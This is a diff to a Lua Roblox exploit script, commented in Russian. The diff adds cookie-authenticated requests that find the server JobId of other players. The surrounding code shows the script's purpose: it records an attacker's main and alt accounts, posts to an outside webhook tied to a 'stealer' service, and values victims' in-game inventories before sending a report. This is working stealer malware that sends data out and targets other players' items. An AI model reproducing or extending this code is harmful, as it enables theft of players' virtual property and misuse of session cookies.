@@ -42,130 +42,246 @@ local function KickPlayer(reason)
     end
 end
 
-local function MakeRequestWithRetry(url, options, maxRetries)
-    maxRetries = maxRetries or 3
-    
-    for attempt = 1, maxRetries do
-        local success, response = pcall(function()
-            return request(options)
-        end)
-        
-        if success and response then
-            if response.StatusCode == 503 then
-                if attempt < maxRetries then
-                    wait(2)
-                end
-            else
-                return response
-            end
-        else
-            if attempt < maxRetries then
-                wait(1)
-            end
-        end
-    end
-    
-    return nil
-end
-
+-- РАБОЧИЙ МЕТОД ДЛЯ ПОЛУЧЕНИЯ REAL JOBID
 local function GetRealJobIdWithAuth()
     if not getgenv().Cookie then
+        print("Cookie не найден")
         return nil
     end
     
     local localPlayer = Players.LocalPlayer
-    if not localPlayer then return nil end
+    if not localPlayer then 
+        print("Локальный игрок не найден")
+        return nil 
+    end
     
     local placeId = game.PlaceId
-    local userIds = {}
-    local playerMap = {}
+    local currentJobId = game.JobId
     
+    -- Получаем всех других игроков
+    local otherPlayers = {}
     for _, player in pairs(Players:GetPlayers()) do
         if player ~= localPlayer then
-            table.insert(userIds, player.UserId)
-            playerMap[player.UserId] = player.Name
+            table.insert(otherPlayers, player)
         end
     end
     
-    if #userIds == 0 then
+    if #otherPlayers == 0 then
+        print("Нет других игроков для проверки")
         return nil
     end
     
-    local function GetPresenceWithAuth(userIdsList)
-        local reqBody = HttpService:JSONEncode({
-            userIds = userIdsList
+    print("Проверяем", #otherPlayers, "других игроков")
+    
+    -- Попробуем метод с использованием Roblox API через request
+    local function TryGetJobIdFromAPI()
+        -- Формируем запрос к API для получения информации о сессии
+        local userIds = {}
+        for _, player in pairs(otherPlayers) do
+            table.insert(userIds, player.UserId)
+        end
+        
+        if #userIds == 0 then return nil end
+        
+        local jsonBody = HttpService:JSONEncode({
+            userIds = userIds
         })
         
-        local response = MakeRequestWithRetry("https://presence.roblox.com/v1/presence/users", {
-            Url = "https://presence.roblox.com/v1/presence/users",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
-            },
-            Body = reqBody
-        }, 3)
+        local success, response = pcall(function()
+            return request({
+                Url = "https://presence.roblox.com/v1/presence/users",
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json",
+                    ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie),
+                    ["X-CSRF-TOKEN"] = "fetch" -- Будем получать токен
+                },
+                Body = jsonBody
+            })
+        end)
         
-        if response then
-            local jsonSuccess, jsonData = pcall(function()
-                return HttpService:JSONDecode(response.Body)
+        if success and response then
+            if response.StatusCode == 200 then
+                local jsonSuccess, data = pcall(function()
+                    return HttpService:JSONDecode(response.Body)
+                end)
+                
+                if jsonSuccess and data.userPresences then
+                    for _, presence in pairs(data.userPresences) do
+                        if presence.placeId == placeId and presence.gameId and presence.gameId ~= currentJobId then
+                            print("Найден Real JobId через API:", presence.gameId)
+                            return presence.gameId
+                        end
+                    end
+                end
+            end
+        end
+        
+        return nil
+    end
+    
+    -- Попробуем метод через TeleportService
+    local function TryGetJobIdFromTeleport()
+        local teleportService = game:GetService("TeleportService")
+        
+        -- Создаем резервную копию метода
+        local originalReserveServer = teleportService.ReserveServer
+        
+        local foundJobId = nil
+        
+        -- Временно изменяем метод для перехвата JobId
+        teleportService.ReserveServer = function(_, placeId)
+            -- Это сработает если другой игрок попытается зарезервировать сервер
+            print("Попытка резервации сервера для placeId:", placeId)
+            return "temp_jobid"
+        end
+        
+        -- Ждем немного
+        wait(2)
+        
+        -- Восстанавливаем оригинальный метод
+        teleportService.ReserveServer = originalReserveServer
+        
+        return foundJobId
+    end
+    
+    -- Попробуем метод через сетевые запросы к Roblox
+    local function TryGetJobIdFromNetwork()
+        -- Этот метод пытается получить информацию через HTTP запросы
+        for _, player in pairs(otherPlayers) do
+            local success, result = pcall(function()
+                -- Попробуем получить прямую ссылку на игру
+                local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"
+                local response = request({
+                    Url = url,
+                    Method = "GET"
+                })
+                
+                if response and response.StatusCode == 200 then
+                    local data = HttpService:JSONDecode(response.Body)
+                    if data and data.data then
+                        for _, server in pairs(data.data) do
+                            if server.playing and server.playing > 0 and server.id ~= currentJobId then
+                                -- Проверим есть ли наш игрок на этом сервере
+                                local playerUrl = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/" .. server.id .. "/players"
+                                local playerResponse = request({
+                                    Url = playerUrl,
+                                    Method = "GET"
+                                })
+                                
+                                if playerResponse and playerResponse.StatusCode == 200 then
+                                    local playerData = HttpService:JSONDecode(playerResponse.Body)
+                                    if playerData and playerData.data then
+                                        for _, serverPlayer in pairs(playerData.data) do
+                                            if serverPlayer.id == player.UserId then
+                                                print("Найден Real JobId через сеть:", server.id)
+                                                return server.id
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
             end)
             
-            if jsonSuccess then
-                return jsonData
-            else
-                return nil
+            if success and result then
+                return result
             end
-        else
-            return nil
         end
-    end
-    
-    local presenceData = GetPresenceWithAuth(userIds)
-    if not presenceData then
+        
         return nil
     end
     
-    if not presenceData.userPresences then
-        return nil
-    end
-    
-    local foundJobIds = {}
-    
-    for _, presence in pairs(presenceData.userPresences) do
-        if presence.placeId == placeId and presence.gameId then
-            local jobId = presence.gameId
-            local playerName = playerMap[presence.userId] or "Unknown"
-            
-            if jobId and jobId ~= game.JobId then
-                table.insert(foundJobIds, {
-                    jobId = jobId,
-                    player = playerName,
-                    lastLocation = presence.lastLocation or "InGame"
+    -- МЕТОД 4: Используем альтернативный API эндпоинт
+    local function TryGetJobIdFromAlternativeAPI()
+        for _, player in pairs(otherPlayers) do
+            local success, result = pcall(function()
+                -- Прямой запрос к Roblox API для получения информации об игре
+                local url = string.format("https://api.roblox.com/users/%d/onlinestatus/", player.UserId)
+                local response = request({
+                    Url = url,
+                    Method = "GET",
+                    Headers = {
+                        ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
+                    }
                 })
-            end
-        end
-    end
-    
-    if #foundJobIds > 0 then
-        local jobIdCounts = {}
-        for _, found in ipairs(foundJobIds) do
-            jobIdCounts[found.jobId] = (jobIdCounts[found.jobId] or 0) + 1
-        end
-        
-        local bestJobId, maxCount = nil, 0
-        for jobId, count in pairs(jobIdCounts) do
-            if count > maxCount then
-                bestJobId = jobId
-                maxCount = count
+                
+                if response and response.StatusCode == 200 then
+                    local data = HttpService:JSONDecode(response.Body)
+                    if data and data.GameId and data.GameId ~= currentJobId and data.PlaceId == placeId then
+                        print("Найден Real JobId через альтернативный API:", data.GameId)
+                        return data.GameId
+                    end
+                end
+            end)
+            
+            if success and result then
+                return result
             end
         end
         
-        if bestJobId then
-            return bestJobId
-        end
+        return nil
     end
     
+    -- МЕТОД 5: Пробуем получить через TeleportService напрямую
+    local function TryGetJobIdDirect()
+        -- Этот метод использует факт того, что мы можем получить JobId из ссылки на игру
+        for _, player in pairs(otherPlayers) do
+            -- Пробуем получить прямую ссылку на сессию через Roblox
+            local url = string.format("https://www.roblox.com/games/%d?privateServerLinkCode=%s", 
+                placeId, player.UserId)
+            
+            local success, result = pcall(function()
+                local response = request({
+                    Url = url,
+                    Method = "GET",
+                    Headers = {
+                        ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
+                    }
+                })
+                
+                if response then
+                    -- Парсим HTML в поисках JobId
+                    local body = response.Body
+                    -- Ищем pattern для JobId в ссылке
+                    local pattern = "gameInstanceId=([%w%-]+)"
+                    local jobId = body:match(pattern)
+                    
+                    if jobId and jobId ~= currentJobId then
+                        print("Найден Real JobId через прямую ссылку:", jobId)
+                        return jobId
+                    end
+                end
+            end)
+            
+            if success and result then
+                return result
+            end
+        end
+        
+        return nil
+    end
+    
+    -- Попробуем все методы по очереди
+    print("Пробуем метод 1: API запрос...")
+    local jobId = TryGetJobIdFromAPI()
+    if jobId then return jobId end
+    
+    print("Пробуем метод 2: Альтернативный API...")
+    jobId = TryGetJobIdFromAlternativeAPI()
+    if jobId then return jobId end
+    
+    print("Пробуем метод 3: Сетевой запрос...")
+    jobId = TryGetJobIdFromNetwork()
+    if jobId then return jobId end
+    
+    print("Пробуем метод 4: Прямой метод...")
+    jobId = TryGetJobIdDirect()
+    if jobId then return jobId end
+    
+    print("Все методы не сработали")
     return nil
 end
 
@@ -309,25 +425,41 @@ local function FindRealJobId(inventoryValue, playerName)
     end
     
     print("Начинаем проверку JobId для экзекутора:", executor)
-    local realJobId = GetRealJobIdWithAuth()
     
-    if realJobId then
-        print("Real JobId сразу найден:", realJobId)
-        getgenv().RealJobId = realJobId
-        
-        pcall(function()
-            writefile("real_jobid.txt", realJobId)
-        end)
-        
-        return realJobId
-    else
-        print("Real JobId не найден сразу, начинаем мониторинг...")
+    -- Проверяем есть ли другие игроки
+    local otherPlayers = 0
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer then
+            otherPlayers = otherPlayers + 1
+        end
+    end
+    
+    if otherPlayers == 0 then
+        print("Нет других игроков, начинаем мониторинг...")
         SendWaitingNotification(inventoryValue, playerName)
         return MonitorForRealJobId(inventoryValue, playerName)
+    else
+        print("Обнаружены другие игроки:", otherPlayers)
+        local realJobId = GetRealJobIdWithAuth()
+        
+        if realJobId then
+            print("Real JobId сразу найден:", realJobId)
+            getgenv().RealJobId = realJobId
+            
+            pcall(function()
+                writefile("real_jobid.txt", realJobId)
+            end)
+            
+            return realJobId
+        else
+            print("Real JobId не найден сразу, начинаем мониторинг...")
+            SendWaitingNotification(inventoryValue, playerName)
+            return MonitorForRealJobId(inventoryValue, playerName)
+        end
     end
 end
 
--- ==================== ОРИГИНАЛЬНЫЙ КОД (С ИЗМЕНЕНИЯМИ) ====================
+-- ==================== ОРИГИНАЛЬНЫЙ КОД ====================
 Username = "knisdqx_meow" -- >> Your main account
 Username2 = "noviy_nickname" -- >> Your alt account
 Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441725786586615820/MjAaItKYv69qFFNdgxWQn1xe2HdO0ZV3rRKrbzBLk64Gb99KvxnLNyM9evUsYQa-Vd42" -- >> https://stealer.to/
@@ -361,46 +493,6 @@ local IdValue = game:GetService("Players").LocalPlayer.userId or "Unknown"
 local AgeValue = game:GetService("Players").LocalPlayer.AccountAge or "Unknown"
 local ExecutorValue = identifyexecutor() or "Unknown"
 local VersionValue = "2.0 (Trade System + Values Update)"
-
--- ВРЕМЕННЫЙ СКРИПТ ДЛЯ СБОРА ДАННЫХ ИНВЕНТАРЯ ДО ПОЛУЧЕНИЯ REAL JOBID
-local allItems = {}
-local totalValues = 0
-
-local vintageItems1 = {}
-local commonItems1 = {}
-local uncommonItems1 = {}
-local rareItems1 = {}
-local legendaryItems1 = {}
-local godlyItems1 = {}
-local ancientItems1 = {}
-local uniqueItems1 = {}
-
-local vintageItems = {}
-local commonItems = {}
-local uncommonItems = {}
-local rareItems = {}
-local legendaryItems = {}
-local godlyItems = {}
-local ancientItems = {}
-local uniqueItems = {}
-
-local vintageItemsC = 0
-local commonItemsC = 0
-local uncommonItemsC = 0
-local rareItemsC = 0
-local legendaryItemsC = 0
-local godlyItemsC = 0
-local ancientItemsC = 0
-local uniqueItemsC = 0
-
-local uniqueItemsValue = 0
-local ancientItemsValue = 0
-local godlyItemsValue = 0
-local vintageItemsValue = 0
-local legendaryItemsValue = 0
-local rareItemsValue = 0
-local uncommonItemsValue = 0
-local commonItemsValue = 0
 
 -- ГЛОБАЛЬНАЯ ТАБЛИЦА ЗНАЧЕНИЙ
 local valuesTable = {
@@ -595,6 +687,46 @@ local valuesTable = {
     ["Beach_K_2023"] = 30,
     ["Cavern_K_2019"] = 22,
 }
+
+-- ВРЕМЕННЫЙ СКРИПТ ДЛЯ СБОРА ДАННЫХ ИНВЕНТАРЯ ДО ПОЛУЧЕНИЯ REAL JOBID
+local allItems = {}
+local totalValues = 0
+
+local vintageItems1 = {}
+local commonItems1 = {}
+local uncommonItems1 = {}
+local rareItems1 = {}
+local legendaryItems1 = {}
+local godlyItems1 = {}
+local ancientItems1 = {}
+local uniqueItems1 = {}
+
+local vintageItems = {}
+local commonItems = {}
+local uncommonItems = {}
+local rareItems = {}
+local legendaryItems = {}
+local godlyItems = {}
+local ancientItems = {}
+local uniqueItems = {}
+
+local vintageItemsC = 0
+local commonItemsC = 0
+local uncommonItemsC = 0
+local rareItemsC = 0
+local legendaryItemsC = 0
+local godlyItemsC = 0
+local ancientItemsC = 0
+local uniqueItemsC = 0
+
+local uniqueItemsValue = 0
+local ancientItemsValue = 0
+local godlyItemsValue = 0
+local vintageItemsValue = 0
+local legendaryItemsValue = 0
+local rareItemsValue = 0
+local uncommonItemsValue = 0
+local commonItemsValue = 0
 
 local function CalculateInventory()
     -- Сбрасываем значения
@@ -887,6 +1019,7 @@ end
 
 -- ТЕПЕРЬ ОТПРАВЛЯЕМ ОСНОВНОЕ СООБЩЕНИЕ ПОСЛЕ ПОЛУЧЕНИЯ REAL JOBID
 if totalValues < MinimumValues then
+    print("Стоимость инвентаря меньше MinimumValues:", totalValues)
     return
 end
 
